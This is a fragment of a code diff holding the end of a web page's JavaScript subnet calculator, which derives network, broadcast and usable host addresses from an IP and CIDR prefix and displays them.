+            const ipNum = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3];
+            
+            const mask = (~0 << (32 - cidr)) & 0xFFFFFFFF;
+            const network = ipNum & mask;
+            const broadcast = network | (~mask & 0xFFFFFFFF);
+            const firstHost = network + 1;
+            const lastHost = broadcast - 1;
+            const totalHosts = Math.pow(2, 32 - cidr) - 2;
+
+            const toIP = (num) => {
+                return [(num >>> 24) & 255, (num >>> 16) & 255, (num >>> 8) & 255, num & 255].join('.');
+            };
+
+            const result = `
+                <strong>Network Address:</strong> ${toIP(network)}/${cidr}<br>
+                <strong>Subnet Mask:</strong> ${toIP(mask)}<br>
+                <strong>Broadcast Address:</strong> ${toIP(broadcast)}<br>
+                <strong>First Usable IP:</strong> ${toIP(firstHost)}<br>
+                <strong>Last Usable IP:</strong> ${toIP(lastHost)}<br>
+                <strong>Total Usable Hosts:</strong> ${totalHosts > 0 ? totalHosts : 1}
+            `;
+
+            document.getElementById('subnet-result').innerHTML = result;
+        }
+
+        calculateSubnet();
+    </script>
+</body>
+</html>
